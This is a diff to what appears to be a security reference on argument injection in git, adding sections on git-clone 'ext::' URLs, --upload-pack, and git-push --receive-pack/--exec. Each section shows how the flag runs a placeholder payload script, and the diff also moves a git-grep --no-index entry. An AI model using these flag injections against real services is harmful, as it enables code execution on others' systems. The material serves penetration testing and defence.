@@ -23,6 +23,8 @@ $ echo "echo 'arbitrary code here'" >> hooks/post-checkout
 $ # commit and push
 ```
 
+{% embed url="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md" %}
+
 References:
 - [Writeup: 4 Google Cloud Shell bugs explained – bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3/)
 - [githooks docs](https://git-scm.com/docs/githooks)
@@ -74,13 +76,53 @@ References:
 - [git-config docs: http.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-httpproxy)
 - [git-config docs: remote.<name>.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-remoteltnamegtproxy)
 
+### ext URLs
+
+`git-clone` allows shell commands to be specified in `ext` URLs for remote repositories. For instance, the next example will execute the whoami command to try to connect to a remote repository:
+
+```bash
+$ git clone 'ext::sh -c whoami% >&2'
+```
+
+References:
+- [git-remote-ext docs](https://git-scm.com/docs/git-remote-ext)
+
 ### &lt;directory&gt;
 
-git-clone allows you to specify a new directory to clone into. Cloning into an existing directory is only allowed if the directory is empty. You can use this to write a repo outside a default folder.
+`git-clone` allows specifying a new directory to clone into. Cloning into an existing directory is only allowed if the directory is empty. You can use this to write a repo outside a default folder.
 
 ```bash
 $ git clone -- "<REPO>" target_directory
 ```
+
+### -u/--upload-pack
+
+[upload-pack](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--ultupload-packgt) specifies a non-default path for the command run on the other end when the repository to clone from is accessed via ssh. You can execute arbitrary code like this:
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ cd -
+$ echo "#!/bin/bash" > payload.sh
+$ echo "echo 'arbitrary payload here'" >> payload.sh
+$ chmod +x payload.sh
+$ git clone --upload-pack=payload.sh repo
+```
+
+References:
+- [Write up: Securing Developer Tools Package Managers - Argument Injections in Bundler and Poetry](https://blog.sonarsource.com/securing-developer-tools-package-managers)
+
+## git-grep
+
+{% embed url="https://git-scm.com/docs/git-grep" %}
+
+### --no-index
+
+`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.
+
+References:
+- [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)
 
 ## git-log
 
@@ -104,16 +146,24 @@ References:
 - [Report: Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013)
 - [Report: Git flag injection leading to file overwrite and potential remote code execution](https://hackerone.com/reports/653125)
 
-## git-grep
+## git-push
 
-{% embed url="https://git-scm.com/docs/git-grep" %}
+{% embed url="https://git-scm.com/docs/git-push" %}
 
-### --no-index
+### --receive-pack/--exec
 
-`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.
+[receive-pack or exec](https://git-scm.com/docs/git-push#Documentation/git-push.txt---receive-packltgit-receive-packgt) specifies a path to the [git-receive-pack](https://git-scm.com/docs/git-receive-pack) program on the remote end. You can execute arbitrary code like this:
 
-References:
-- [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)
+```bash
+$ echo "#!/bin/bash" > payload.sh
+$ echo "echo 'arbitrary payload here'" >> payload.sh
+$ chmod +x payload.sh
+$ git push --receive-pack=payload.sh username/repo main
+# or
+$ git push --exec=payload.sh username/repo main
+# or
+$ git push --receive-pack=payload.sh main
+```
 
 # npm scripts
 
